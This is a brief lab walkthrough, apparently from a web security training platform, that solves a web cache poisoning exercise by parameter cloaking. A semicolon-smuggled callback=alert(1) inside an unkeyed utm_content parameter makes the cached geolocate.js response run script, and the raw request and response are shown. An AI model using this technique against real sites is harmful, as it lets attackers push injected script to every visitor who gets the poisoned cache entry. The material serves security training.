# **Parameter cloaking**

Task: This lab is vulnerable to web cache poisoning because it excludes a certain parameter from the cache key. There is also inconsistent parameter parsing between the cache and the back-end. A user regularly visits this site's home page using Chrome.

To solve the lab, use the parameter cloaking technique to poison the cache with a response that executes `alert(1)` in the victim's browser.

Toolkit: BurpSuite,Browser

1. guess query params → Identified parameter on 0a44003304ac955e80a4c6d400ae0066.web-security-academy.net: utm\_content  
2. check if it reflects in resp → OK  
3.        \<script type="text/javascript" src="/js/[geolocate.js?callback=setCountryCookie](http://geolocate.js?callback=setCountryCookie)"\>

see in script param “callback”

4. send a req

GET /js/geolocate.js?callback=setCountryCookie\&utm\_content=fasdd;callback=alert(1) HTTP/2  
Host: [0a44003304ac955e80a4c6d400ae0066.web-security-academy.net](http://0a44003304ac955e80a4c6d400ae0066.web-security-academy.net)

HTTP/2 200 OK  
Content-Type: application/javascript; charset=utf-8  
X-Frame-Options: SAMEORIGIN  
Cache-Control: max-age=35  
Age: 2  
X-Cache: hit  
Content-Length: 193

const setCountryCookie \= (country) \=\> { document.cookie \= 'country=' \+ country; };  
const setLangCookie \= (lang) \=\> { document.cookie \= 'lang=' \+ lang; };  
alert(1)({"country":"United Kingdom"});

SOLVED
